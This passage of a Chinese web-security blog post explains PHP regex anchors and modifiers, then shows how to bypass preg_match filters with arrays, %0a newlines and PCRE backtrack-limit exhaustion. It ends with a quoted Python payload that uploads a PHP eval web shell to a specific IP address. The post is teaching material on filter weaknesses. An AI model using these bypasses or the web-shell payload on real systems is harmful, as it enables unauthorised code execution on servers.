data-num=\"2\"></td><td><pre><span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"1test1</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>test2\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">preg_match_all</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/^test/\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span></pre></td></tr></table></figure><p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221108213541566.png\" alt=\"image-20221108213541566\" /></p>\n<p>然后来试一下 ^ 的作用</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"test1</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>test2\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">preg_match_all</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/^\\w&#123;1，109&#125;/\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span></pre></td></tr></table></figure><p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221108212503702.png\" alt=\"image-20221108212503702\" /></p>\n<p>这里 ^ 从开始位置匹配，但是不会匹配到 \\n 以后的内容</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"test1</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>test2\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">preg_match_all</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/\\w&#123;1,100&#125;$/\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span></pre></td></tr></table></figure><p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221108212605604.png\" alt=\"image-20221108212605604\" /></p>\n<p>从末尾匹配但是不会匹配 \\n 之前的内容</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"test1</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>test2\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">preg_match_all</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/^\\w&#123;1,100&#125;$/\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span></pre></td></tr></table></figure><p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221108213846413.png\" alt=\"image-20221108213846413\" /></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221108214404871.png\" alt=\"image-20221108214404871\" /></p>\n<p>当两个符号一起使用时只匹配第一行，有 \\n 不会匹配</p>\n<p>补充：这里进行对照排除 \\w 模式的影响</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221108214825884.png\" alt=\"image-20221108214825884\" /></p>\n<h3 id=\"修饰符\"><a class=\"anchor\" href=\"#修饰符\">#</a> 修饰符</h3>\n<p>对于 preg_mach 我跟喜欢称其为模式</p>\n<ul>\n<li>\n<p>i 不区分大小写</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"abc ABC\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">preg_match_all</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/abc/i\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span></pre></td></tr></table></figure><p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221108215432175.png\" alt=\"image-20221108215432175\" /></p>\n</li>\n<li>\n<p>g 查找所有的匹配项</p>\n<p>这个就相当于 preg_match_all () 函数</p>\n</li>\n<li>\n<p>m 多行匹配模式</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"a</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>a</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>a\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token function\">preg_match_all</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/[a-z]/m\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span></pre></td></tr></table></figure><p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221108215756785.png\" alt=\"image-20221108215756785\" /></p>\n</li>\n<li>\n<p>s 使。包含 \\n</p>\n</li>\n</ul>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"a</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>a\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">preg_match_all</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/./m\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span></pre></td></tr></table></figure><p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221108215829517.png\" alt=\"image-20221108215829517\" /></p>\n<h3 id=\"运算符优先级\"><a class=\"anchor\" href=\"#运算符优先级\">#</a> 运算符优先级</h3>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:left\">运算符</th>\n<th style=\"text-align:left\">描述</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:left\">\\</td>\n<td style=\"text-align:left\">转义符</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">(), (?😃, (?=), []</td>\n<td style=\"text-align:left\">圆括号和方括号</td>\n</tr>\n<tr>\n<td style=\"text-align:left\" n,m=\"\">*, +, ?, {n}, {n,},</td>\n<td style=\"text-align:left\">限定符</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">^, $, \\ 任何元字符、任何字符</td>\n<td style=\"text-align:left\">定位点和序列（即：位置和顺序）</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">|</td>\n<td style=\"text-align:left\">替换，&quot;或&quot; 操作 字符具有高于替换运算符的优先级，使得 &quot;m|food&quot; 匹配 &quot;m&quot; 或 &quot;food&quot;。若要匹配 &quot;mood&quot; 或 &quot;food&quot;，请使用括号创建子表达式，从而产生 &quot;(m|f) ood&quot;。</td>\n</tr>\n</tbody>\n<tbody>\n<tr>\n<td style=\"text-align:left\">这里分享一个小工具，好评 [正则表达式在线测试</td>\n<td style=\"text-align:left\">菜鸟工具 (<span class=\"exturl\" data-url=\"aHR0cDovL3J1bm9vYi5jb20=\">runoob.com</span>)](<span class=\"exturl\" data-url=\"aHR0cHM6Ly9jLnJ1bm9vYi5jb20vZnJvbnQtZW5kLzg1NC8=\">https://c.runoob.com/front-end/854/</span>)</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"preg_match绕过\"><a class=\"anchor\" href=\"#preg_match绕过\">#</a> preg_match 绕过</h3>\n<p>正则扯了这么久，现在来说说这个万恶的 preg_match 怎么绕过</p>\n<h4 id=\"数组绕过\"><a class=\"anchor\" href=\"#数组绕过\">#</a> 数组绕过</h4>\n<p>preg_match 只能处理字符串，当传入的 subject 是数组时会返回 false</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token number\">5</span><span class=\"token punctuation\">,</span><span class=\"token number\">6</span><span class=\"token punctuation\">,</span><span class=\"token number\">7</span><span class=\"token punctuation\">,</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token number\">9</span><span class=\"token punctuation\">,</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>@<span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/./m\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"Match found\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><h4 id=\"换行绕过\"><a class=\"anchor\" href=\"#换行绕过\">#</a> 换行绕过</h4>\n<p>上面测试也有提到，当 ^$ 同时存在且不是 m 模式的情况下，有换行返回空，且点不会匹配换行</p>\n<p>因此面对下面的情况中就能通过换行来绕过正则</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'a'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/^[a-z0-9]+$/'</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"OK\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"NG\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>这里遇到换行匹配不到</p>\n<pre><code>http://127.0.0.1/?a=123%0a\n</code></pre>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221108222815571.png\" alt=\"image-20221108222815571\" /></p>\n<pre><code>http://127.0.0.1/?a=%0a123\n</code></pre>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221108222700947.png\" alt=\"image-20221108222700947\" /></p>\n<h4 id=\"回溯次数限制\"><a class=\"anchor\" href=\"#回溯次数限制\">#</a> 回溯次数限制</h4>\n<p>这里拜读 p 牛的文章<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubGVhdmVzb25ncy5jb20vUEVORVRSQVRJT04vdXNlLXBjcmUtYmFja3RyYWNrLWxpbWl0LXRvLWJ5cGFzcy1yZXN0cmljdC5odG1s\"> PHP 利用 PCRE 回溯次数限制绕过某些安全限制 | 离别歌 (leavesongs.com)</span></p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'a'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>@<span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/&lt;\\?.*[(`;?>].*/is'</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"OK\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"NG\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>对于 demo 中的正则表达式</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">/</span><span class=\"token operator\">&lt;</span>\\<span class=\"token operator\">?</span><span class=\"token operator\">.</span><span class=\"token operator\">*</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span>`<span class=\"token punctuation\">;</span><span class=\"token operator\">?</span><span class=\"token operator\">></span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token operator\">*</span><span class=\"token operator\">/</span>is</pre></td></tr></table></figure><p>假设传入 &lt;?php phpinfo ();//aaaaa</p>\n<p>传入正则后.* 匹配全部的字符，但是</p>\n<pre><code>[(`;?&gt;\n</code></pre>\n<p>没有匹配到东西，于是会吐出一个 a，还是匹配不上，一直回溯到 phpinfo () 后面的；，停止回溯</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221108223613099.png\" alt=\"image-20221108223613099\" /></p>\n<p>PHP 为了防止正则表达式的拒绝服务攻击（reDOS），给 pcre 设定了一个回溯次数上限 <code>pcre.backtrack_limit</code> 。我们可以通过 <code>var_dump(ini_get('pcre.backtrack_limit'));</code>  的方式查看当前环境下的上限</p>\n<p>可见，回溯次数上限默认是 100 万。如果我们回溯超过 100 万次 preg_match 就会返回 false</p>\n<p>大佬的 payload</p>\n<figure class=\"highlight py\"><figcaption data-lang=\"Python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> requests</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> io <span class=\"token keyword\">import</span> BytesIO</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>files <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token string\">'file'</span><span class=\"token punctuation\">:</span> BytesIO<span class=\"token punctuation\">(</span><span class=\"token string\">b'aaa&lt;?php eval($_POST[txt]);//'</span> <span class=\"token operator\">+</span> <span class=\"token string\">b'a'</span> <span class=\"token operator\">*</span> <span class=\"token number\">1000000</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>res <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span><span class=\"token string\">'http://51.158.75.42:8088/index.php'</span><span class=\"token punctuation\">,</span> files<span class=\"token operator\">=</span>files<span class=\"token punctuation\">,</span> allow_redirects<span class=\"token operator\">=</span><span class=\"token boolean\">False</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>res<span class=\"token punctuation\">.</span>headers<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><hr class=\"footnotes-sep\" />\n<section class=\"footnotes\">\n<ol class=\"footnotes-list\">\n<li id=\"fn1\" class=\"footnote-item\"><p>0-9 <a href=\"#fnref1\" class=\"footnote-backref\">↩︎</a></p>\n</li>\n</ol>\n</section>\n",
            "tags": [
                "Web",
                "正则表达式"
            ]
        }
    ]
}